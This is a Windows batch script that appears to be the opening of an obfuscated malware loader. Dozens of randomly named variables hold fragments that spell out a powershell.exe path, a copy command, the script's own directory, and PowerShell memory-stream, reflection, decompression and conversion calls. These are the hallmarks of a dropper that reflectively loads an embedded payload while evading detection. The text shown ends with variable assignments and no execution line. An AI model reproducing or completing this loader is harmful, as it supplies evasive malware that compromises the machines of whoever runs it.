@echo off
set "mGeHIeNztA=:\"
set "AXQHjpCNHZ=rS"
set "TSVWqqvGFM=1."
set "TvNWGPKDDL=ws"
set "yniWWAndpX=Sy"
set "HvhaEUYOGv=rs"
set "Kdgkyaxkqu=em"
set "FlnDkDPHeu=\v"
set "EaCTRJNHQp=Wi"
set "nXvYgdTZDR=he"
set "SQtaiVjyqZ=we"
set "mWNSLmYJAF=ow"
set "nRvthhVaEX=co"
set "cdMVmInDan=do"
set "LCuMuwOylR=he"
set "YdoxnHmJhF=st"
set "AGonJvGCWb=Po"
set "qQhQdcrsUE= /"
set "QLsbrLgJkV=nd"
set "cKHYudbNNL=ll"
set "KpJnOvgXyV=in"
set "XCKLilUZmM= C"
set "bFeOgZrwAN=ll"
set "gLnzWPpSmg=0\"
set "YVtDHNARVc=\W"
set "SdqjKEoHIp=py"
set "nPZVtzpQBR=po"
set "LpQLwZORWl=32"
set "ZFkhzRHZqz=.e"
set "BAjgEJLvJU=xe"
set "DBnTwHMnyp=y "
set "RPoiKWZRTz=s\"
set "GhtQYjPKHe=we"
set "ZrhacvUBQg=cd"
set "gHupkGTxNE= %~dp0"
set "KOStAKtjLk=O.Me"
set "jmZOqfTAMd=ne);"
set "SeGAMtBukF=yste"
set "yUjgvIoKyB=PxEW"
set "qrbHUrwlcZ=($zz"
set "zvwxtZFsCH=lit("
set "sFTQIfenss=-Obj"
set "MlVEtkPbju=AgQ."
set "SSZGyTUWFD=[Env"
set "avyPPNBXTM=ress"
set "GOYiUrLxOK=$WiS"
set "ZaQBuqyfYv=Disp"
set "BxIjrvavyM=em.I"
set "ppWemgmrOG=vVW."
set "kdQykFdiEi=mfH "
set "ccbQGEDpsb=daeR"
set "VEjaOMxqhj=).Sp"
set "PaaELAUbyV=k; }"
set "bupxODGiLe=am;$"
set "iGqwgSWnzO=$pLA"
set "YOmDFMiduC=$WiS"
set "zBLiVnmaXn=flec"
set "cpyvcBzosX=Conv"
set "bQTYizYkVo=brea"
set "zYQINZMsCO=join"
set "OYZOVRuPOl=m.Re"
set "hftuAqhWpe=Comp"
set "fITbxztveV=Ngiq"
set "HUpzNFZdjY=gQ.T"
set "iosNRVPAel=iSAH"
set "YYzdwWYIao=1] -"
set "IyTTziSmcr=gth)"
set "cLkOqesgbz=$WiS"
set "kYkjkPhUXU=.IO."
set "JcmBYPDzpI=();$"
set "ylcZbVKlne=e]::"
set "EDuJPtiiab=..-1"
set "irjEIfeDqr=.Dis"
set "ShTQhUJhzO=ring"
set "QmnnqfRZdG=ptor"
set "GEvAcxqOUv=)($T"
set "TrUYDwnZVI=CFxo"
